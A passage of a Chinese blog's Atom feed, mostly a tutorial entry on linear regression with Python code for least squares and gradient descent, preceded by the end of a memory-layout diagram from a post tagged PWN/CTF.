|&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    +----------------------+    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ^   |                      |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                |   |         heap         |    | 3GB&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                |   |                      |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    +----------------------+    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |  Read&amp;#x2F;Write Segments |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |        .bss          |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |        .data         |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    +----------------------+    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |  Read-only Segments  |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    | .init .text .rodata  |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |                      |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x08048000  ------&amp;gt; +----------------------+    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |       reserved       |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00000000  ------&amp;gt; +----------------------+ &amp;lt;--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://wutao18.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="PWN" scheme="http://wutao18.github.io/tags/PWN/"/>
    
      <category term="操作系统" scheme="http://wutao18.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="Linux" scheme="http://wutao18.github.io/tags/Linux/"/>
    
      <category term="CTF学习" scheme="http://wutao18.github.io/tags/CTF%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="C语言" scheme="http://wutao18.github.io/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>线性回归及Python实现</title>
    <link href="http://wutao18.github.io/2020/06/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E5%8F%8APython%E5%AE%9E%E7%8E%B0/"/>
    <id>http://wutao18.github.io/2020/06/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E5%8F%8APython%E5%AE%9E%E7%8E%B0/</id>
    <published>2020-06-21T12:05:30.000Z</published>
    <updated>2020-10-27T07:07:57.881Z</updated>
    
    <content type="html"><![CDATA[<h2 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h2><p><strong>线性模型</strong>：</p><script type="math/tex; mode=display">y = \boldsymbol{w}^T \boldsymbol{x} + b \tag{1}</script><p>数据集：$D = \{(\boldsymbol{x}_1, y_1), (\boldsymbol{x}_2, y_2), … , (\boldsymbol{x}_m, y_m)\}$，$\boldsymbol{x}_i = (x_{i1}; x_{i2};…; x_{id})$</p><p><strong>损失函数</strong> (Loss function) 采用平方损失：</p><script type="math/tex; mode=display">L(\boldsymbol{w}, b) = \sum_{i=1}^m (y_i - \hat{y_i})^2</script><script type="math/tex; mode=display">= \sum_{i=1}^m (y_i - (\boldsymbol{w}^T \boldsymbol{x}_i + b))^2\tag{2}</script><p>目标是找到一组解 $(\boldsymbol{w}^{\star}, b^{\star})$ 使得损失函数的值最小，即：</p><script type="math/tex; mode=display">(\boldsymbol{w}^*, b^*) = \mathop{arg\ min}\limits_{(\boldsymbol{w}, b)}L(\boldsymbol{w}, b)</script><script type="math/tex; mode=display">= \mathop{arg\ min}\limits_{(\boldsymbol{w}, b)} \sum_{i=1}^m (y_i - (\boldsymbol{w}^T \boldsymbol{x}_i + b))^2\tag{3}</script><a id="more"></a><p>求解方法：</p><ul><li><strong>最小二乘法</strong></li><li><strong>梯度下降法</strong><ul><li>模拟退火</li><li>随机梯度下降</li></ul></li></ul><p>损失函数的代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 误差函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss_function</span><span class="params">(w, b, x, y)</span>:</span></span><br><span class="line">  x = np.array(x)</span><br><span class="line">  y = np.array(y).reshape(len(y), <span class="number">1</span>)</span><br><span class="line">  w = np.array(w)</span><br><span class="line">  b = np.array(b)</span><br><span class="line"></span><br><span class="line">  x = np.matrix(x)</span><br><span class="line">  y = np.matrix(y)</span><br><span class="line">  w = np.matrix(w)</span><br><span class="line">  b = np.matrix(b)</span><br><span class="line">  </span><br><span class="line">  err = [[<span class="number">0.0</span>]]</span><br><span class="line">  m = len(x)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">    err = err + (y[i] - w.T * x[i] - b) ** <span class="number">2</span></span><br><span class="line">    <span class="comment"># err = err + abs(y[i,:] - w.T * x[i,:] - b)</span></span><br><span class="line">  <span class="keyword">return</span> err.tolist()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 误差函数重载，这里的w包含了w和b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss_function</span><span class="params">(w, x, y)</span>:</span></span><br><span class="line">  x = np.array(x)</span><br><span class="line">  y = np.array(y).reshape(len(y), <span class="number">1</span>)</span><br><span class="line">  w = np.array(w)</span><br><span class="line"></span><br><span class="line">  x=np.concatenate((x, np.ones((len(x), <span class="number">1</span>))), axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  x = np.matrix(x)</span><br><span class="line">  y = np.matrix(y)</span><br><span class="line">  w = np.matrix(w)</span><br><span class="line">  <span class="comment"># print(w)</span></span><br><span class="line">  </span><br><span class="line">  err = <span class="number">0.0</span></span><br><span class="line">  m = len(x)</span><br><span class="line">  <span class="comment"># print('-------')</span></span><br><span class="line">  <span class="comment"># print(m)</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">    pp= x[i] * w</span><br><span class="line">    p=(y[i] - pp.T )</span><br><span class="line">    err = err + p * p.T</span><br><span class="line">    <span class="comment"># err = err + (y[i] - x[i] * w.T ) ** 2</span></span><br><span class="line">  <span class="comment"># return math.sqrt(err.tolist()[0][0])/10</span></span><br><span class="line">  <span class="keyword">return</span> err.tolist()[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#测试</span></span><br><span class="line"></span><br><span class="line">x = [ [<span class="number">1.</span>], [<span class="number">2.</span>]]</span><br><span class="line">y = [ <span class="number">1.</span>, <span class="number">2.</span>]</span><br><span class="line"></span><br><span class="line">print(loss_function([<span class="number">1</span>], <span class="number">0</span>, x, y))</span><br></pre></td></tr></table></figure><p>运行结果为：</p><pre><code>0.0</code></pre><h2 id="最小二乘法"><a href="#最小二乘法" class="headerlink" title="最小二乘法"></a>最小二乘法</h2><p>把 $\boldsymbol{w}$ 和 $b$ 吸收入向量形式 $\hat{\boldsymbol{w}} = (\boldsymbol{w}; b)$</p><p>把数据集 $D$ 的输入表示为一个 $m \times (d + 1)$ 大小的矩阵 $\boldsymbol{X}$</p><script type="math/tex; mode=display">\boldsymbol{X} = \left(    \begin{array}{cccc|c}      x_{11} & x_{12} & \cdots & x_{1d} & 1 \\      x_{21} & x_{22} & \cdots & x_{2d} & 1 \\      \vdots & \vdots & \ddots & \vdots & \vdots \\      x_{m1} & x_{m2} & \cdots & x_{md} & 1 \\    \end{array}\right) = \left(    \begin{array}{c|c}      \boldsymbol{x}_{1}^T & 1 \\      \boldsymbol{x}_{2}^T & 1 \\      \vdots & \vdots \\      \boldsymbol{x}_{m}^T & 1 \\    \end{array}\right)</script><p>把输出也表示成向量形式 $\boldsymbol{y} = (y_1; y_2; …; y_n)$</p><p>式(2) 可表示为</p><script type="math/tex; mode=display">L(\hat{\boldsymbol{w}}) = (\boldsymbol{y} - \boldsymbol{X} \hat{\boldsymbol{w}})^T(\boldsymbol{y} - \boldsymbol{X} \hat{\boldsymbol{w}})\tag{4}</script><p>式(3) 可表示为</p><script type="math/tex; mode=display">\hat{\boldsymbol{w}}^* = \mathop{arg\ min}\limits_{\hat{\boldsymbol{w}}} (\boldsymbol{y} - \boldsymbol{X} \hat{\boldsymbol{w}})^T(\boldsymbol{y} - \boldsymbol{X} \hat{\boldsymbol{w}})\tag{5}</script><p>对式(4)求导可得</p><script type="math/tex; mode=display">\frac{\partial L(\hat{\boldsymbol{w}})}{\partial \hat{\boldsymbol{w}}} = 2 \boldsymbol{X}^T(\boldsymbol{X} \hat{\boldsymbol{w}} - \boldsymbol{y})\tag{6}</script><p>当 $\boldsymbol{X}^T\boldsymbol{X}$ 为满秩矩阵时（不是满秩矩阵时无法求解），令式(5)等于0可得解为</p><script type="math/tex; mode=display">\hat{\boldsymbol{w}}^* = (\boldsymbol{X}^T\boldsymbol{X})^{-1}\boldsymbol{X}^T \boldsymbol{y}\tag{7}</script><p>Python代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 求解</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_w</span><span class="params">(x, y)</span>:</span></span><br><span class="line">  w = (x.T * x).I * x.T * y</span><br><span class="line">  <span class="keyword">return</span> w.tolist()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最小二乘法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">least_squares</span><span class="params">(x, y)</span>:</span></span><br><span class="line">  x = np.array(x)</span><br><span class="line"></span><br><span class="line">  x = np.concatenate((x, np.ones((len(x), <span class="number">1</span>))), axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  x = np.matrix(x)</span><br><span class="line">  <span class="comment"># print(x)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  y = np.array(y).reshape(len(y), <span class="number">1</span>)</span><br><span class="line">  y = np.matrix(y)</span><br><span class="line">  <span class="comment"># print(y)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> get_w(x, y)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试</span></span><br><span class="line"><span class="comment"># x = [[1], [2], [3]]</span></span><br><span class="line"><span class="comment"># y = [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line">x = [ [<span class="number">338.</span>], [<span class="number">333.</span>], [<span class="number">328.</span>], [<span class="number">207.</span>], [<span class="number">226.</span>], [<span class="number">25.</span>], [<span class="number">179.</span>], [<span class="number">60.</span>], [<span class="number">208.</span>], [<span class="number">606.</span>]]</span><br><span class="line">y = [ <span class="number">640.</span>, <span class="number">633.</span>, <span class="number">619.</span>, <span class="number">393.</span>, <span class="number">428.</span>, <span class="number">27.</span>, <span class="number">193.</span>, <span class="number">66.</span>, <span class="number">226.</span>, <span class="number">1591.</span>]</span><br><span class="line"></span><br><span class="line">w = least_squares(x, y)</span><br><span class="line">w0 = w[<span class="number">0</span>:len(w) - <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">print(math.sqrt(loss_function(w0, w[<span class="number">-1</span>][<span class="number">0</span>], x, y)) / len(x))</span><br></pre></td></tr></table></figure><p>运行结果为：</p><pre><code>31.927531989787543</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画图</span></span><br><span class="line"></span><br><span class="line">x_list = []</span><br><span class="line">y_list = y</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">  x_list.append(i[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建图</span></span><br><span class="line">ax = plt.gca()</span><br><span class="line"><span class="comment">#设置x轴、y轴名称</span></span><br><span class="line">ax.set_xlabel(<span class="string">'x'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#画散点图，以x_list中的值为横坐标，以y_list中的值为纵坐标</span></span><br><span class="line"><span class="comment">#参数c指定点的颜色，s指定点的大小,alpha指定点的透明度</span></span><br><span class="line">ax.scatter(x_list, y_list, c=<span class="string">'r'</span>, s=<span class="number">20</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">print(str(w[<span class="number">0</span>][<span class="number">0</span>]) + <span class="string">' '</span> + str(w[<span class="number">1</span>][<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p1 = [<span class="number">0</span>, <span class="number">600</span>]</span><br><span class="line">p2 = [<span class="number">0</span> * w[<span class="number">0</span>][<span class="number">0</span>] + w[<span class="number">1</span>][<span class="number">0</span>], <span class="number">600</span> * w[<span class="number">0</span>][<span class="number">0</span>] + w[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line">ax1 = plt.gca()</span><br><span class="line"><span class="comment">#设置x轴、y轴名称</span></span><br><span class="line">ax1.set_xlabel(<span class="string">'x'</span>)</span><br><span class="line">ax1.set_ylabel(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数c指定连线的颜色，linewidth指定连线宽度，alpha指定连线的透明度</span></span><br><span class="line">ax1.plot(p1, p2, color=<span class="string">'b'</span>, linewidth=<span class="number">1</span>, alpha=<span class="number">0.6</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>模型的解为：</p><pre><code>2.669454966762257 -188.43319665732653</code></pre><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20200621194739.png" alt="20200621194739"></p><p>采用statsmodels库求线性回归作为对比：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 采用statsmodels库求线性回归</span></span><br><span class="line"><span class="keyword">import</span> statsmodels.api <span class="keyword">as</span> sm</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">x = [ [<span class="number">338.</span>], [<span class="number">333.</span>], [<span class="number">328.</span>], [<span class="number">207.</span>], [<span class="number">226.</span>], [<span class="number">25.</span>], [<span class="number">179.</span>], [<span class="number">60.</span>], [<span class="number">208.</span>], [<span class="number">606.</span>]]</span><br><span class="line">y = [ <span class="number">640.</span>, <span class="number">633.</span>, <span class="number">619.</span>, <span class="number">393.</span>, <span class="number">428.</span>, <span class="number">27.</span>, <span class="number">193.</span>, <span class="number">66.</span>, <span class="number">226.</span>, <span class="number">1591.</span>]</span><br><span class="line">x = sm.add_constant(x) <span class="comment"># 若模型中有截距，必须有这一步</span></span><br><span class="line">model = sm.OLS(y, x).fit() <span class="comment"># 构建最小二乘模型并拟合</span></span><br><span class="line">print(model.summary()) <span class="comment"># 输出回归结果</span></span><br></pre></td></tr></table></figure><pre><code>                            OLS Regression Results                            ==============================================================================Dep. Variable:                      y   R-squared:                       0.944Model:                            OLS   Adj. R-squared:                  0.938Method:                 Least Squares   F-statistic:                     136.1Date:                Wed, 10 Jun 2020   Prob (F-statistic):           2.66e-06Time:                        07:28:51   Log-Likelihood:                -60.337No. Observations:                  10   AIC:                             124.7Df Residuals:                       8   BIC:                             125.3Df Model:                           1                                         Covariance Type:            nonrobust                                         ==============================================================================                 coef    std err          t      P&gt;|t|      [0.025      0.975]------------------------------------------------------------------------------const       -188.4332     67.619     -2.787      0.024    -344.363     -32.503x1             2.6695      0.229     11.667      0.000       2.142       3.197==============================================================================Omnibus:                        1.562   Durbin-Watson:                   2.661Prob(Omnibus):                  0.458   Jarque-Bera (JB):                0.877Skew:                           0.356   Prob(JB):                        0.645Kurtosis:                       1.737   Cond. No.                         560.==============================================================================Warnings:[1] Standard Errors assume that the covariance matrix of the errors is correctly specified./usr/local/lib/python3.6/dist-packages/scipy/stats/stats.py:1535: UserWarning: kurtosistest only valid for n&gt;=20 ... continuing anyway, n=10  &quot;anyway, n=%i&quot; % int(n))</code></pre><p>可以看到结果基本一致。   </p><h2 id="梯度下降法"><a href="#梯度下降法" class="headerlink" title="梯度下降法"></a>梯度下降法</h2><p>式(4)的梯度为</p><script type="math/tex; mode=display">\nabla L(\hat{\boldsymbol{w}}) = \left(    \begin{matrix}      \frac{\partial L(\hat{\boldsymbol{w}})}{\partial w_1} \\      \frac{\partial L(\hat{\boldsymbol{w}})}{\partial w_2} \\      \vdots \\      \frac{\partial L(\hat{\boldsymbol{w}})}{\partial w_d} \\      \frac{\partial L(\hat{\boldsymbol{w}})}{\partial b} \\    \end{matrix}\right)= \frac{\partial L(\hat{\boldsymbol{w}})}{\partial \hat{\boldsymbol{w}}} = 2 \boldsymbol{X}^T(\boldsymbol{X} \hat{\boldsymbol{w}} - \boldsymbol{y})\tag{8}</script><p>根据梯度下降法，不断更新 $\hat{\boldsymbol{w}}$ 去寻找 $\hat{\boldsymbol{w}}^*$。参数的更新以目标的负梯度为方向，$t$ 表示第 $t$ 次更新参数，$\eta$ 表示学习率。</p><script type="math/tex; mode=display">\hat{\boldsymbol{w}}^{(t+1)} = \hat{\boldsymbol{w}}^{(t)} - \eta \nabla L(\hat{\boldsymbol{w}}^{(t)}) \tag{9}</script><p>Python代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 梯度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient</span><span class="params">(w, x, y)</span>:</span></span><br><span class="line">  x = np.array(x)</span><br><span class="line">  y = np.array(y).reshape(len(y), <span class="number">1</span>)</span><br><span class="line">  x = np.concatenate((x, np.ones((len(x), <span class="number">1</span>))), axis=<span class="number">1</span>)</span><br><span class="line">  w = np.array(w)</span><br><span class="line"></span><br><span class="line">  x = np.matrix(x)</span><br><span class="line">  y = np.matrix(y)</span><br><span class="line">  w = np.matrix(w)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># print(w)</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * x.T * (x * w - y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 梯度下降</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient_descent</span><span class="params">(x, y)</span>:</span></span><br><span class="line">  lr = <span class="number">0.0000001</span>  <span class="comment"># learning rate</span></span><br><span class="line">  iteration = <span class="number">1000000</span>  <span class="comment"># 迭代次数</span></span><br><span class="line">  w = np.ones((<span class="number">1</span>, len(x[<span class="number">0</span>]) + <span class="number">1</span>)).T</span><br><span class="line">  w[len(x[<span class="number">0</span>])][<span class="number">0</span>] = y[<span class="number">0</span>] - x[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">  <span class="comment"># w=data.iloc[1:2,1:-1].values</span></span><br><span class="line">  <span class="comment"># w=np.concatenate((w, np.ones((len(w), 1))), axis=1).T</span></span><br><span class="line">  <span class="comment"># print(x)</span></span><br><span class="line">  <span class="comment"># print(w)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(iteration):</span><br><span class="line">    w = w - lr * gradient(w, x, y)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> w</span><br></pre></td></tr></table></figure><p>测试结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试</span></span><br><span class="line"><span class="comment"># data=pd.read_csv('final_data.csv',encoding='gb18030')</span></span><br><span class="line"><span class="comment"># x = data.iloc[:,1:-1].values</span></span><br><span class="line"><span class="comment"># y = data.iloc[:,0].values</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(x)</span></span><br><span class="line"><span class="comment"># print(y)</span></span><br><span class="line"></span><br><span class="line">x = [ [<span class="number">338.</span>], [<span class="number">333.</span>], [<span class="number">328.</span>], [<span class="number">207.</span>], [<span class="number">226.</span>], [<span class="number">25.</span>], [<span class="number">179.</span>], [<span class="number">60.</span>], [<span class="number">208.</span>], [<span class="number">606.</span>]]</span><br><span class="line">y = [ <span class="number">640.</span>, <span class="number">633.</span>, <span class="number">619.</span>, <span class="number">393.</span>, <span class="number">428.</span>, <span class="number">27.</span>, <span class="number">193.</span>, <span class="number">66.</span>, <span class="number">226.</span>, <span class="number">1591.</span>]</span><br><span class="line"></span><br><span class="line">w = gradient_descent(x, y)</span><br><span class="line">w = w.tolist()</span><br><span class="line"></span><br><span class="line">print(w)</span><br><span class="line"></span><br><span class="line">w0 = w[<span class="number">0</span>:len(w) - <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(math.sqrt(loss_function(w0, w[-1][0], x, y)) / len(x))</span></span><br><span class="line">print(math.sqrt(loss_function(w, x, y)) / len(x))  <span class="comment"># 均方误差</span></span><br></pre></td></tr></table></figure><p>模型的解及误差为：</p><pre><code>[[2.664103150270952], [-186.57092397847248]]31.929045483933738</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画图</span></span><br><span class="line"></span><br><span class="line">x_list = []</span><br><span class="line">y_list = y</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">  x_list.append(i[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建图</span></span><br><span class="line">ax = plt.gca()</span><br><span class="line"><span class="comment">#设置x轴、y轴名称</span></span><br><span class="line">ax.set_xlabel(<span class="string">'x'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#画散点图，以x_list中的值为横坐标，以y_list中的值为纵坐标</span></span><br><span class="line"><span class="comment">#参数c指定点的颜色，s指定点的大小,alpha指定点的透明度</span></span><br><span class="line">ax.scatter(x_list, y_list, c=<span class="string">'r'</span>, s=<span class="number">20</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">print(str(w[<span class="number">0</span>][<span class="number">0</span>]) + <span class="string">' '</span> + str(w[<span class="number">1</span>][<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p1 = [<span class="number">0</span>, <span class="number">600</span>]</span><br><span class="line">p2 = [<span class="number">0</span> * w[<span class="number">0</span>][<span class="number">0</span>] + w[<span class="number">1</span>][<span class="number">0</span>], <span class="number">600</span> * w[<span class="number">0</span>][<span class="number">0</span>] + w[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line">ax1 = plt.gca()</span><br><span class="line"><span class="comment">#设置x轴、y轴名称</span></span><br><span class="line">ax1.set_xlabel(<span class="string">'x'</span>)</span><br><span class="line">ax1.set_ylabel(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数c指定连线的颜色，linewidth指定连线宽度，alpha指定连线的透明度</span></span><br><span class="line">ax1.plot(p1, p2, color=<span class="string">'b'</span>, linewidth=<span class="number">1</span>, alpha=<span class="number">0.6</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>2.664103150270952 -186.57092397847248</code></pre><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20200621195200.png" alt="20200621195200"></p><p>线性回归也可以求解<strong>非线性模型</strong>。如引入二次项：</p><script type="math/tex; mode=display">y = \boldsymbol{w}_2^T\left(    \begin{matrix}      x_1^2 \\      x_2^2 \\      \vdots \\      x_d^2 \\    \end{matrix}\right)+ \boldsymbol{w}_1^T\left(    \begin{matrix}      x_1 \\      x_2 